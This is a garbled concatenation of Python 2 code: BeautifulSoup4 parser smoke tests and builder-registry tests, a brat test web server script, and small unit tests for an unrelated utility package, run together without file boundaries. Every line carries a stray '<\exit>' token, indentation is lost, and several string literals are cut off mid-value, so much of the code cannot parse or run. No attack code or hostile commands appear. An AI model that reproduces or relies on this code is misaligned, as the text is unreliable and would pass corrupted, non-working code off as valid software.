builder = kwargs.pop('builder', self.default_builder)<\exit>
return BeautifulSoup(markup, builder=builder, **kwargs)<\exit>
def document_for(self, markup):<\exit>
return self.default_builder.test_fragment_to_document(markup)<\exit>
def assertSoupEquals(self, to_parse, compare_parsed_to=None):<\exit>
builder = self.default_builder<\exit>
obj = BeautifulSoup(to_parse, builder=builder)<\exit>
if compare_parsed_to is None:<\exit>
compare_parsed_to = to_parse<\exit>
self.assertEqual(obj.decode(), self.document_for(compare_parsed_to))<\exit>
class HTMLTreeBuilderSmokeTest(object):<\exit>
def assertDoctypeHandled(self, doctype_fragment):<\exit>
doctype_str, soup = self._document_with_doctype(doctype_fragment)<\exit>
doctype = soup.contents[0]<\exit>
self.assertEqual(doctype.__class__, Doctype)<\exit>
self.assertEqual(doctype, doctype_fragment)<\exit>
self.assertEqual(str(soup)[:len(doctype_str)], doctype_str)<\exit>
self.assertEqual(soup.p.contents[0], 'foo')<\exit>
def _document_with_doctype(self, doctype_fragment):<\exit>
doctype = '<!DOCTYPE %s>' % doctype_fragment<\exit>
markup = doctype + '\n<p>foo</p>'<\exit>
soup = self.soup(markup)<\exit>
return doctype, soup<\exit>
def test_normal_doctypes(self):<\exit>
self.assertDoctypeHandled("html")<\exit>
self.assertDoctypeHandled(<\exit>
'html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"')<\exit>
def test_public_doctype_with_url(self):<\exit>
doctype = 'html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"'<\exit>
self.assertDoctypeHandled(doctype)<\exit>
def test_system_doctype(self):<\exit>
self.assertDoctypeHandled('foo SYSTEM "http://www.example.com/"')<\exit>
def test_namespaced_system_doctype(self):<\exit>
self.assertDoctypeHandled('xsl:stylesheet SYSTEM "htmlent.dtd"')<\exit>
def test_namespaced_public_doctype(self):<\exit>
self.assertDoctypeHandled('xsl:stylesheet PUBLIC "htmlent.dtd"')<\exit>
def test_real_xhtml_document(self):<\exit>
markup = b<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(<\exit>
soup.encode("utf-8").replace(b"\n", b""),<\exit>
markup.replace(b"\n", b""))<\exit>
def test_deepcopy(self):<\exit>
copy.deepcopy(self.default_builder)<\exit>
def test_p_tag_is_never_empty_element(self):<\exit>
soup = self.soup("<p/>")<\exit>
self.assertFalse(soup.p.is_empty_element)<\exit>
self.assertEqual(str(soup.p), "<p></p>")<\exit>
def test_unclosed_tags_get_closed(self):<\exit>
self.assertSoupEquals("<p>", "<p></p>")<\exit>
self.assertSoupEquals("<b>", "<b></b>")<\exit>
self.assertSoupEquals("<br>", "<br/>")<\exit>
def test_br_is_always_empty_element_tag(self):<\exit>
soup = self.soup("<br></br>")<\exit>
self.assertTrue(soup.br.is_empty_element)<\exit>
self.assertEqual(str(soup.br), "<br/>")<\exit>
def test_nested_formatting_elements(self):<\exit>
self.assertSoupEquals("<em><em></em></em>")<\exit>
def test_comment(self):<\exit>
markup = "<p>foo<!--foobar-->baz</p>"<\exit>
self.assertSoupEquals(markup)<\exit>
soup = self.soup(markup)<\exit>
comment = soup.find(text="foobar")<\exit>
self.assertEqual(comment.__class__, Comment)<\exit>
def test_preserved_whitespace_in_pre_and_textarea(self):<\exit>
self.assertSoupEquals("<pre>   </pre>")<\exit>
self.assertSoupEquals("<textarea> woo  </textarea>")<\exit>
def test_nested_inline_elements(self):<\exit>
b_tag = "<b>Inside a B tag</b>"<\exit>
self.assertSoupEquals(b_tag)<\exit>
nested_b_tag = "<p>A <i>nested <b>tag</b></i></p>"<\exit>
self.assertSoupEquals(nested_b_tag)<\exit>
double_nested_b_tag = "<p>A <a>doubly <i>nested <b>tag</b></i></a></p>"<\exit>
self.assertSoupEquals(nested_b_tag)<\exit>
def test_nested_block_level_elements(self):<\exit>
soup = self.soup('<blockquote><p><b>Foo</b></p></blockquote>')<\exit>
blockquote = soup.blockquote<\exit>
self.assertEqual(blockquote.p.b.string, 'Foo')<\exit>
self.assertEqual(blockquote.b.string, 'Foo')<\exit>
def test_correctly_nested_tables(self):<\exit>
markup = ('<table id="1">'<\exit>
'<tr>'<\exit>
"<td>Here's another table:"<\exit>
'<table id="2">'<\exit>
'<tr><td>foo</td></tr>'<\exit>
'</table></td>')<\exit>
self.assertSoupEquals(<\exit>
markup,<\exit>
'<table id="1"><tr><td>Here\'s another table:'<\exit>
'<table id="2"><tr><td>foo</td></tr></table>'<\exit>
'</td></tr></table>')<\exit>
self.assertSoupEquals(<\exit>
"<table><thead><tr><td>Foo</td></tr></thead>"<\exit>
"<tbody><tr><td>Bar</td></tr></tbody>"<\exit>
"<tfoot><tr><td>Baz</td></tr></tfoot></table>")<\exit>
def test_deeply_nested_multivalued_attribute(self):<\exit>
markup = '<table><div><div class="css"></div></div></table>'<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(["css"], soup.div.div['class'])<\exit>
def test_angle_brackets_in_attribute_values_are_escaped(self):<\exit>
self.assertSoupEquals('<a b="<a>"></a>', '<a b="&lt;a&gt;"></a>')<\exit>
def test_entities_in_attributes_converted_to_unicode(self):<\exit>
expect = u'<p id="pi\N{LATIN SMALL LETTER N WITH TILDE}ata"></p>'<\exit>
self.assertSoupEquals('<p id="pi&<\exit>
self.assertSoupEquals('<p id="pi&<\exit>
self.assertSoupEquals('<p id="pi&ntilde;ata"></p>', expect)<\exit>
def test_entities_in_text_converted_to_unicode(self):<\exit>
expect = u'<p>pi\N{LATIN SMALL LETTER N WITH TILDE}ata</p>'<\exit>
self.assertSoupEquals("<p>pi&<\exit>
self.assertSoupEquals("<p>pi&<\exit>
self.assertSoupEquals("<p>pi&ntilde;ata</p>", expect)<\exit>
def test_quot_entity_converted_to_quotation_mark(self):<\exit>
self.assertSoupEquals("<p>I said &quot;good day!&quot;</p>",<\exit>
'<p>I said "good day!"</p>')<\exit>
def test_out_of_range_entity(self):<\exit>
expect = u"\N{REPLACEMENT CHARACTER}"<\exit>
self.assertSoupEquals("&<\exit>
self.assertSoupEquals("&<\exit>
self.assertSoupEquals("&<\exit>
def test_basic_namespaces(self):<\exit>
markup = b'<html xmlns="http://www.w3.org/1999/xhtml" xmlns:mathml="http://www.w3.org/1998/Math/MathML" xmlns:svg="http://www.w3.org/2000/svg"><head></head><body><mathml:msqrt>4</mathml:msqrt><b svg:fill="red"></b></body></html>'<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(markup, soup.encode())<\exit>
html = soup.html<\exit>
self.assertEqual('http://www.w3.org/1999/xhtml', soup.html['xmlns'])<\exit>
self.assertEqual(<\exit>
'http://www.w3.org/1998/Math/MathML', soup.html['xmlns:mathml'])<\exit>
self.assertEqual(<\exit>
'http://www.w3.org/2000/svg', soup.html['xmlns:svg'])<\exit>
def test_multivalued_attribute_value_becomes_list(self):<\exit>
markup = b'<a class="foo bar">'<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(['foo', 'bar'], soup.a['class'])<\exit>
def test_soupstrainer(self):<\exit>
strainer = SoupStrainer("b")<\exit>
soup = self.soup("A <b>bold</b> <meta/> <i>statement</i>",<\exit>
parse_only=strainer)<\exit>
self.assertEqual(soup.decode(), "<b>bold</b>")<\exit>
def test_single_quote_attribute_values_become_double_quotes(self):<\exit>
self.assertSoupEquals("<foo attr='bar'></foo>",<\exit>
'<foo attr="bar"></foo>')<\exit>
def test_attribute_values_with_nested_quotes_are_left_alone(self):<\exit>
text =<\exit>
self.assertSoupEquals(text)<\exit>
def test_attribute_values_with_double_nested_quotes_get_quoted(self):<\exit>
text =<\exit>
soup = self.soup(text)<\exit>
soup.foo['attr'] = 'Brawls happen at "Bob\'s Bar"'<\exit>
self.assertSoupEquals(<\exit>
soup.foo.decode(),<\exit>
)<\exit>
def test_ampersand_in_attribute_value_gets_escaped(self):<\exit>
self.assertSoupEquals('<this is="really messed up & stuff"></this>',<\exit>
'<this is="really messed up &amp; stuff"></this>')<\exit>
self.assertSoupEquals(<\exit>
'<a href="http://example.org?a=1&b=2;3">foo</a>',<\exit>
'<a href="http://example.org?a=1&amp;b=2;3">foo</a>')<\exit>
def test_escaped_ampersand_in_attribute_value_is_left_alone(self):<\exit>
self.assertSoupEquals('<a href="http://example.org?a=1&amp;b=2;3"></a>')<\exit>
def test_entities_in_strings_converted_during_parsing(self):<\exit>
text = "<p>&lt;&lt;sacr&eacute;&<\exit>
expected = u"<p>&lt;&lt;sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!&gt;&gt;</p>"<\exit>
self.assertSoupEquals(text, expected)<\exit>
def test_smart_quotes_converted_on_the_way_in(self):<\exit>
quote = b"<p>\x91Foo\x92</p>"<\exit>
soup = self.soup(quote)<\exit>
self.assertEqual(<\exit>
soup.p.string,<\exit>
u"\N{LEFT SINGLE QUOTATION MARK}Foo\N{RIGHT SINGLE QUOTATION MARK}")<\exit>
def test_non_breaking_spaces_converted_on_the_way_in(self):<\exit>
soup = self.soup("<a>&nbsp;&nbsp;</a>")<\exit>
self.assertEqual(soup.a.string, u"\N{NO-BREAK SPACE}" * 2)<\exit>
def test_entities_converted_on_the_way_out(self):<\exit>
text = "<p>&lt;&lt;sacr&eacute;&<\exit>
expected = u"<p>&lt;&lt;sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!&gt;&gt;</p>".encode("utf-8")<\exit>
soup = self.soup(text)<\exit>
self.assertEqual(soup.p.encode("utf-8"), expected)<\exit>
def test_real_iso_latin_document(self):<\exit>
unicode_html = u'<html><head><meta content="text/html; charset=ISO-Latin-1" http-equiv="Content-type"/></head><body><p>Sacr\N{LATIN SMALL LETTER E WITH ACUTE} bleu!</p></body></html>'<\exit>
iso_latin_html = unicode_html.encode("iso-8859-1")<\exit>
soup = self.soup(iso_latin_html)<\exit>
result = soup.encode("utf-8")<\exit>
expected = unicode_html.replace("ISO-Latin-1", "utf-8")<\exit>
expected = expected.encode("utf-8")<\exit>
self.assertEqual(result, expected)<\exit>
def test_real_shift_jis_document(self):<\exit>
shift_jis_html = (<\exit>
b'<html><head></head><body><pre>'<\exit>
b'\x82\xb1\x82\xea\x82\xcdShift-JIS\x82\xc5\x83R\x81[\x83f'<\exit>
b'\x83B\x83\x93\x83O\x82\xb3\x82\xea\x82\xbd\x93\xfa\x96{\x8c'<\exit>
b'\xea\x82\xcc\x83t\x83@\x83C\x83\x8b\x82\xc5\x82\xb7\x81B'<\exit>
b'</pre></body></html>')<\exit>
unicode_html = shift_jis_html.decode("shift-jis")<\exit>
soup = self.soup(unicode_html)<\exit>
self.assertEqual(soup.encode("utf-8"), unicode_html.encode("utf-8"))<\exit>
self.assertEqual(soup.encode("euc_jp"), unicode_html.encode("euc_jp"))<\exit>
def test_real_hebrew_document(self):<\exit>
hebrew_document = b'<html><head><title>Hebrew (ISO 8859-8) in Visual Directionality</title></head><body><h1>Hebrew (ISO 8859-8) in Visual Directionality</h1>\xed\xe5\xec\xf9</body></html>'<\exit>
soup = self.soup(<\exit>
hebrew_document, from_encoding="iso8859-8")<\exit>
self.assertEqual(soup.original_encoding, 'iso8859-8')<\exit>
self.assertEqual(<\exit>
soup.encode('utf-8'),<\exit>
hebrew_document.decode("iso8859-8").encode("utf-8"))<\exit>
def test_meta_tag_reflects_current_encoding(self):<\exit>
meta_tag = ('<meta content="text/html; charset=x-sjis" '<\exit>
'http-equiv="Content-type"/>')<\exit>
shift_jis_html = (<\exit>
'<html><head>\n%s\n'<\exit>
'<meta http-equiv="Content-language" content="ja"/>'<\exit>
'</head><body>Shift-JIS markup goes here.') % meta_tag<\exit>
soup = self.soup(shift_jis_html)<\exit>
parsed_meta = soup.find('meta', {'http-equiv': 'Content-type'})<\exit>
content = parsed_meta['content']<\exit>
self.assertEqual('text/html; charset=x-sjis', content)<\exit>
self.assertTrue(isinstance(content, ContentMetaAttributeValue))<\exit>
self.assertEqual('text/html; charset=utf8', content.encode("utf8"))<\exit>
def test_html5_style_meta_tag_reflects_current_encoding(self):<\exit>
meta_tag = ('<meta id="encoding" charset="x-sjis" />')<\exit>
shift_jis_html = (<\exit>
'<html><head>\n%s\n'<\exit>
'<meta http-equiv="Content-language" content="ja"/>'<\exit>
'</head><body>Shift-JIS markup goes here.') % meta_tag<\exit>
soup = self.soup(shift_jis_html)<\exit>
parsed_meta = soup.find('meta', id="encoding")<\exit>
charset = parsed_meta['charset']<\exit>
self.assertEqual('x-sjis', charset)<\exit>
self.assertTrue(isinstance(charset, CharsetMetaAttributeValue))<\exit>
self.assertEqual('utf8', charset.encode("utf8"))<\exit>
def test_tag_with_no_attributes_can_have_attributes_added(self):<\exit>
data = self.soup("<a>text</a>")<\exit>
data.a['foo'] = 'bar'<\exit>
self.assertEqual('<a foo="bar">text</a>', data.a.decode())<\exit>
class XMLTreeBuilderSmokeTest(object):<\exit>
def test_docstring_generated(self):<\exit>
soup = self.soup("<root/>")<\exit>
self.assertEqual(<\exit>
soup.encode(), b'<?xml version="1.0" encoding="utf-8"?>\n<root/>')<\exit>
def test_real_xhtml_document(self):<\exit>
markup = b<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(<\exit>
soup.encode("utf-8"), markup)<\exit>
def test_popping_namespaced_tag(self):<\exit>
markup = '<rss xmlns:dc="foo"><dc:creator>b</dc:creator><dc:date>2012-07-02T20:33:42Z</dc:date><dc:rights>c</dc:rights><image>d</image></rss>'<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(<\exit>
unicode(soup.rss), markup)<\exit>
def test_docstring_includes_correct_encoding(self):<\exit>
soup = self.soup("<root/>")<\exit>
self.assertEqual(<\exit>
soup.encode("latin1"),<\exit>
b'<?xml version="1.0" encoding="latin1"?>\n<root/>')<\exit>
def test_large_xml_document(self):<\exit>
markup = (b'<?xml version="1.0" encoding="utf-8"?>\n<root>'<\exit>
+ b'0' * (2**12)<\exit>
+ b'</root>')<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(soup.encode("utf-8"), markup)<\exit>
def test_tags_are_empty_element_if_and_only_if_they_are_empty(self):<\exit>
self.assertSoupEquals("<p>", "<p/>")<\exit>
self.assertSoupEquals("<p>foo</p>")<\exit>
def test_namespaces_are_preserved(self):<\exit>
markup = '<root xmlns:a="http://example.com/" xmlns:b="http://example.net/"><a:foo>This tag is in the a namespace</a:foo><b:foo>This tag is in the b namespace</b:foo></root>'<\exit>
soup = self.soup(markup)<\exit>
root = soup.root<\exit>
self.assertEqual("http://example.com/", root['xmlns:a'])<\exit>
self.assertEqual("http://example.net/", root['xmlns:b'])<\exit>
def test_closing_namespaced_tag(self):<\exit>
markup = '<p xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:date>20010504</dc:date></p>'<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(unicode(soup.p), markup)<\exit>
def test_namespaced_attributes(self):<\exit>
markup = '<foo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><bar xsi:schemaLocation="http://www.example.com"/></foo>'<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual(unicode(soup.foo), markup)<\exit>
class HTML5TreeBuilderSmokeTest(HTMLTreeBuilderSmokeTest):<\exit>
def test_real_xhtml_document(self):<\exit>
pass<\exit>
def test_html_tags_have_namespace(self):<\exit>
markup = "<a>"<\exit>
soup = self.soup(markup)<\exit>
self.assertEqual("http://www.w3.org/1999/xhtml", soup.a.namespace)<\exit>
def test_svg_tags_have_namespace(self):<\exit>
markup = '<svg><circle/></svg>'<\exit>
soup = self.soup(markup)<\exit>
namespace = "http://www.w3.org/2000/svg"<\exit>
self.assertEqual(namespace, soup.svg.namespace)<\exit>
self.assertEqual(namespace, soup.circle.namespace)<\exit>
def test_mathml_tags_have_namespace(self):<\exit>
markup = '<math><msqrt>5</msqrt></math>'<\exit>
soup = self.soup(markup)<\exit>
namespace = 'http://www.w3.org/1998/Math/MathML'<\exit>
self.assertEqual(namespace, soup.math.namespace)<\exit>
self.assertEqual(namespace, soup.msqrt.namespace)<\exit>
def skipIf(condition, reason):<\exit>
def nothing(test, *args, **kwargs):<\exit>
return None<\exit>
def decorator(test_item):<\exit>
if condition:<\exit>
return nothing<\exit>
else:<\exit>
return test_item<\exit>
return decorator<\exit>
from django.test import TestCase<\exit>
from BaseHTTPServer import HTTPServer, test as simple_http_server_test<\exit>
from CGIHTTPServer import CGIHTTPRequestHandler<\exit>
from CGIHTTPServer import _url_collapse_path_split<\exit>
from sys import stderr<\exit>
from urlparse import urlparse<\exit>
class BRATCGIHTTPRequestHandler(CGIHTTPRequestHandler):<\exit>
def is_cgi(self):<\exit>
if urlparse(self.path).path.endswith('.cgi'):<\exit>
self.cgi_info = _url_collapse_path_split(self.path)<\exit>
return True<\exit>
else:<\exit>
return CGIHTTPRequestHandler.is_cgi(self)<\exit>
def main(args):<\exit>
try:<\exit>
try:<\exit>
port = int(args[1])<\exit>
except ValueError:<\exit>
raise TypeError<\exit>
except TypeError:<\exit>
print >> stderr, '%s is not a valid port number' % args[1]<\exit>
return -1<\exit>
except IndexError:<\exit>
port = 8000<\exit>
print >> stderr, 'WARNING: This server is for testing purposes only!'<\exit>
print >> stderr, ('    You can also use it for trying out brat before '<\exit>
'deploying on a "real" web server such as Apache.')<\exit>
print >> stderr, ('    Using this web server to run brat on an open '<\exit>
'network is a security risk!')<\exit>
print >> stderr<\exit>
print >> stderr, 'You can access the test server on:'<\exit>
print >> stderr<\exit>
print >> stderr, '    http://localhost:%s/' % port<\exit>
print >> stderr<\exit>
simple_http_server_test(BRATCGIHTTPRequestHandler, HTTPServer)<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import unittest<\exit>
from bs4 import BeautifulSoup<\exit>
from bs4.builder import (<\exit>
builder_registry as registry,<\exit>
HTMLParserTreeBuilder,<\exit>
TreeBuilderRegistry,<\exit>
)<\exit>
try:<\exit>
from bs4.builder import HTML5TreeBuilder<\exit>
HTML5LIB_PRESENT = True<\exit>
except ImportError:<\exit>
HTML5LIB_PRESENT = False<\exit>
try:<\exit>
from bs4.builder import (<\exit>
LXMLTreeBuilderForXML,<\exit>
LXMLTreeBuilder,<\exit>
)<\exit>
LXML_PRESENT = True<\exit>
except ImportError:<\exit>
LXML_PRESENT = False<\exit>
class BuiltInRegistryTest(unittest.TestCase):<\exit>
def test_combination(self):<\exit>
if LXML_PRESENT:<\exit>
self.assertEqual(registry.lookup('fast', 'html'),<\exit>
LXMLTreeBuilder)<\exit>
if LXML_PRESENT:<\exit>
self.assertEqual(registry.lookup('permissive', 'xml'),<\exit>
LXMLTreeBuilderForXML)<\exit>
self.assertEqual(registry.lookup('strict', 'html'),<\exit>
HTMLParserTreeBuilder)<\exit>
if HTML5LIB_PRESENT:<\exit>
self.assertEqual(registry.lookup('html5lib', 'html'),<\exit>
HTML5TreeBuilder)<\exit>
def test_lookup_by_markup_type(self):<\exit>
if LXML_PRESENT:<\exit>
self.assertEqual(registry.lookup('html'), LXMLTreeBuilder)<\exit>
self.assertEqual(registry.lookup('xml'), LXMLTreeBuilderForXML)<\exit>
else:<\exit>
self.assertEqual(registry.lookup('xml'), None)<\exit>
if HTML5LIB_PRESENT:<\exit>
self.assertEqual(registry.lookup('html'), HTML5TreeBuilder)<\exit>
else:<\exit>
self.assertEqual(registry.lookup('html'), HTMLParserTreeBuilder)<\exit>
def test_named_library(self):<\exit>
if LXML_PRESENT:<\exit>
self.assertEqual(registry.lookup('lxml', 'xml'),<\exit>
LXMLTreeBuilderForXML)<\exit>
self.assertEqual(registry.lookup('lxml', 'html'),<\exit>
LXMLTreeBuilder)<\exit>
if HTML5LIB_PRESENT:<\exit>
self.assertEqual(registry.lookup('html5lib'),<\exit>
HTML5TreeBuilder)<\exit>
self.assertEqual(registry.lookup('html.parser'),<\exit>
HTMLParserTreeBuilder)<\exit>
def test_beautifulsoup_constructor_does_lookup(self):<\exit>
BeautifulSoup("", features="html")<\exit>
BeautifulSoup("", features=["html", "fast"])<\exit>
self.assertRaises(ValueError, BeautifulSoup,<\exit>
"", features="no-such-feature")<\exit>
class RegistryTest(unittest.TestCase):<\exit>
def setUp(self):<\exit>
self.registry = TreeBuilderRegistry()<\exit>
def builder_for_features(self, *feature_list):<\exit>
cls = type('Builder_' + '_'.join(feature_list),<\exit>
(object,), {'features' : feature_list})<\exit>
self.registry.register(cls)<\exit>
return cls<\exit>
def test_register_with_no_features(self):<\exit>
builder = self.builder_for_features()<\exit>
self.assertEqual(self.registry.lookup('foo'), None)<\exit>
self.assertEqual(self.registry.lookup(), builder)<\exit>
def test_register_with_features_makes_lookup_succeed(self):<\exit>
builder = self.builder_for_features('foo', 'bar')<\exit>
self.assertEqual(self.registry.lookup('foo'), builder)<\exit>
self.assertEqual(self.registry.lookup('bar'), builder)<\exit>
def test_lookup_fails_when_no_builder_implements_feature(self):<\exit>
builder = self.builder_for_features('foo', 'bar')<\exit>
self.assertEqual(self.registry.lookup('baz'), None)<\exit>
def test_lookup_gets_most_recent_registration_when_no_feature_specified(self):<\exit>
builder1 = self.builder_for_features('foo')<\exit>
builder2 = self.builder_for_features('bar')<\exit>
self.assertEqual(self.registry.lookup(), builder2)<\exit>
def test_lookup_fails_when_no_tree_builders_registered(self):<\exit>
self.assertEqual(self.registry.lookup(), None)<\exit>
def test_lookup_gets_most_recent_builder_supporting_all_features(self):<\exit>
has_one = self.builder_for_features('foo')<\exit>
has_the_other = self.builder_for_features('bar')<\exit>
has_both_early = self.builder_for_features('foo', 'bar', 'baz')<\exit>
has_both_late = self.builder_for_features('foo', 'bar', 'quux')<\exit>
lacks_one = self.builder_for_features('bar')<\exit>
has_the_other = self.builder_for_features('foo')<\exit>
self.assertEqual(self.registry.lookup('foo', 'bar'),<\exit>
has_both_late)<\exit>
self.assertEqual(self.registry.lookup('foo', 'bar', 'baz'),<\exit>
has_both_early)<\exit>
def test_lookup_fails_when_cannot_reconcile_requested_features(self):<\exit>
builder1 = self.builder_for_features('foo', 'bar')<\exit>
builder2 = self.builder_for_features('foo', 'baz')<\exit>
self.assertEqual(self.registry.lookup('bar', 'baz'), None)<\exit>
from unittest import TestCase<\exit>
from util.commons_util.os.child_process import *<\exit>
class TestChildProcess(TestCase):<\exit>
def test_simple_exec(self):<\exit>
self.assertEquals(basic_child_process(),<\exit>
u'Hello from the child!\n')<\exit>
def test_poll_status(self):<\exit>
self.assertEquals(poll_status(), 'Exit status 0')<\exit>
from unittest import TestCase<\exit>
from util.commons_util.fundamentals.class_hierarchy import *<\exit>
class TestProperty(TestCase):<\exit>
def test_property_setter(self):<\exit>
r = VoltageResistance(ohms=10)<\exit>
r.voltage = 10<\exit>
self.assertEquals(r.current, 1)<\exit>
class TestDescriptor(TestCase):<\exit>
def test_grade_descriptor(self):<\exit>
class Exam(object):<\exit>
math_grade = GradeDescriptor()<\exit>
writing_grade = GradeDescriptor()<\exit>
science_grade = GradeDescriptor()<\exit>
exam1 = Exam()<\exit>
exam2 = Exam()<\exit>
with self.assertRaises(ValueError):<\exit>
exam1.science_grade = 101<\exit>
exam1.science_grade = 99<\exit>
exam2.science_grade = 100<\exit>
self.assertEquals(exam1.science_grade, 99)<\exit>
self.assertEquals(exam2.science_grade, 100)<\exit>
from unittest import TestCase<\exit>
import pickle<\exit>
from util.commons_util.fundamentals.pickle.copyreg_demo import *<\exit>
class TestSerialization(TestCase):<\exit>
def test_copyreg(self):<\exit>
state = State()<\exit>
state.points += 1000<\exit>
serialized = pickle.dumps(state)<\exit>
state_after = pickle.loads(serialized)<\exit>
self.assertEquals(state_after.__dict__,<\exit>
{'points': 1000, 'lives': 4, 'level': 0})<\exit>
import random<\exit>
from unittest import TestCase<\exit>
from util.commons_util.fundamentals.data_structs import *<\exit>
class TestDataStructs(TestCase):<\exit>
def test_argsort(self):<\exit>
A = [3, 2, 1]<\exit>
ret = Sorter.argsort(A)<\exit>
self.assertEqual(ret, [2, 1, 0])<\exit>
def test_excel_column(self):<\exit>
col = ExcelColumn()<\exit>
self.assertEqual(list(col.columns(800))[-1], 'adt')<\exit>
class TestDisplayer(TestCase):<\exit>
def test_display(self):<\exit>
dis = Displayer()<\exit>
class A(object):<\exit>
def __init__(self):<\exit>
self.a = "abc"<\exit>
self.b = 1.0<\exit>
class B(object):<\exit>
def __init__(self):<\exit>
self.a = A()<\exit>
self.b = 1.0<\exit>
b = B()<\exit>
self.assertEqual(str(dis.dump(b)), '{"a": {"a": "abc", "b": 1.0}, "b": 1.0}')<\exit>
b_str =<\exit>
self.assertEqual(dis.display(b), b_str)<\exit>
class TestSearcher(TestCase):<\exit>
def test_binary_search(self):<\exit>
rand_lst = [int(1000*random.random()) for _ in xrange(100)]<\exit>
target = rand_lst[0]<\exit>
rand_lst.sort()<\exit>
def predicate(idx):<\exit>
if rand_lst[idx]==target:<\exit>
return 0<\exit>
elif rand_lst[idx]<target:<\exit>
return -1<\exit>
else:<\exit>
return 1<\exit>
idx = Searcher.binary_search(0, 100, predicate)<\exit>
self.assertEqual(target, rand_lst[idx])<\exit>
class TestWrapper(TestCase):<\exit>
def test_unpack(self):<\exit>
x = [random.randint(0, 100) for _ in xrange(100)]<\exit>
y = [random.randint(0, 100) for _ in xrange(100)]<\exit>
lst = zip(x, y)<\exit>
a, b = Wrapper.unpack(lst)<\exit>
self.assertEqual(a, tuple(x))<\exit>
self.assertEqual(b, tuple(y))<\exit>
"Test harness for doctests."<\exit>
__metaclass__ = type<\exit>
__all__ = [<\exit>
'additional_tests',<\exit>
]<\exit>
import atexit<\exit>
import doctest<\exit>
import os<\exit>
import unittest<\exit>
DOCTEST_FLAGS = (<\exit>
doctest.ELLIPSIS |<\exit>
doctest.NORMALIZE_WHITESPACE |<\exit>
doctest.REPORT_NDIFF)<\exit>
from unittest import TestCase<\exit>
from util.commons_util.fundamentals.generators import *<\exit>
class TestGenerator(TestCase):<\exit>
def test_coroutine(self):<\exit>
itr = first_coroutine()<\exit>
itr.next()<\exit>
self.assertEquals(itr.send(1), "Received: 1")<\exit>
self.assertEquals(itr.send(2), "Received: 2")<\exit>
def test_yieldmin(self):<\exit>
itr = minimize()<\exit>
next(itr)<\exit>
self.assertEquals(itr.send(10), 10)<\exit>
self.assertEquals(itr.send(4), 4)<\exit>
self.assertEquals(itr.send(22), 4)<\exit>
self.assertEquals(itr.send(-1), -1)<\exit>
import warnings<\exit>
try:<\exit>
from bs4.builder import HTML5TreeBuilder<\exit>
HTML5LIB_PRESENT = True<\exit>
except ImportError, e:<\exit>
HTML5LIB_PRESENT = False<\exit>
from bs4.element import SoupStrainer<\exit>
from bs4.testing import (<\exit>
HTML5TreeBuilderSmokeTest,<\exit>
SoupTest,<\exit>
skipIf,<\exit>
)<\exit>
@skipIf(<\exit>
not HTML5LIB_PRESENT,<\exit>
"html5lib seems not to be present, not testing its tree builder.")<\exit>
class HTML5LibBuilderSmokeTest(SoupTest, HTML5TreeBuilderSmokeTest):<\exit>
@property<\exit>
def default_builder(self):<\exit>
return HTML5TreeBuilder()<\exit>
def test_soupstrainer(self):<\exit>
strainer = SoupStrainer("b")<\exit>
markup = "<p>A <b>bold</b> statement.</p>"<\exit>
with warnings.catch_warnings(record=True) as w:<\exit>
soup = self.soup(markup, parse_only=strainer)<\exit>
self.assertEqual(<\exit>
soup.decode(), self.document_for(markup))<\exit>
self.assertTrue(<\exit>
"the html5lib tree builder doesn't support parse_only" in<\exit>
str(w[0].message))<\exit>
def test_correctly_nested_tables(self):<\exit>
markup = ('<table id="1">'<\exit>
'<tr>'<\exit>
"<td>Here's another table:"<\exit>
'<table id="2">'<\exit>
'<tr><td>foo</td></tr>'<\exit>
'</table></td>')<\exit>
self.assertSoupEquals(<\exit>
markup,<\exit>
'<table id="1"><tbody><tr><td>Here\'s another table:'<\exit>
'<table id="2"><tbody><tr><td>foo</td></tr></tbody></table>'<\exit>
'</td></tr></tbody></table>')<\exit>
self.assertSoupEquals(<\exit>
"<table><thead><tr><td>Foo</td></tr></thead>"<\exit>
"<tbody><tr><td>Bar</td></tr></tbody>"<\exit>
"<tfoot><tr><td>Baz</td></tr></tfoot></table>")<\exit>
from bs4.testing import SoupTest, HTMLTreeBuilderSmokeTest<\exit>
from bs4.builder import HTMLParserTreeBuilder<\exit>
class HTMLParserTreeBuilderSmokeTest(SoupTest, HTMLTreeBuilderSmokeTest):<\exit>
@property<\exit>
def default_builder(self):<\exit>
return HTMLParserTreeBuilder()<\exit>
def test_namespaced_system_doctype(self):<\exit>
pass<\exit>
def test_namespaced_public_doctype(self):<\exit>
pass<\exit>
import re<\exit>
import warnings<\exit>
try:<\exit>
from bs4.builder import LXMLTreeBuilder, LXMLTreeBuilderForXML<\exit>
LXML_PRESENT = True<\exit>
except ImportError, e:<\exit>
LXML_PRESENT = False<\exit>
from bs4 import (<\exit>
BeautifulSoup,<\exit>
BeautifulStoneSoup,<\exit>
)<\exit>
from bs4.element import Comment, Doctype, SoupStrainer<\exit>
from bs4.testing import skipIf<\exit>
from bs4.tests import test_htmlparser<\exit>
from bs4.testing import (<\exit>
HTMLTreeBuilderSmokeTest,<\exit>
XMLTreeBuilderSmokeTest,<\exit>
SoupTest,<\exit>
skipIf,<\exit>
)<\exit>
@skipIf(<\exit>
not LXML_PRESENT,<\exit>
"lxml seems not to be present, not testing its tree builder.")<\exit>
class LXMLTreeBuilderSmokeTest(SoupTest, HTMLTreeBuilderSmokeTest):<\exit>
@property<\exit>
def default_builder(self):<\exit>
return LXMLTreeBuilder()<\exit>
def test_out_of_range_entity(self):<\exit>
self.assertSoupEquals(<\exit>
"<p>foo&<\exit>
self.assertSoupEquals(<\exit>
"<p>foo&<\exit>
self.assertSoupEquals(<\exit>
"<p>foo&<\exit>
def test_beautifulstonesoup_is_xml_parser(self):<\exit>
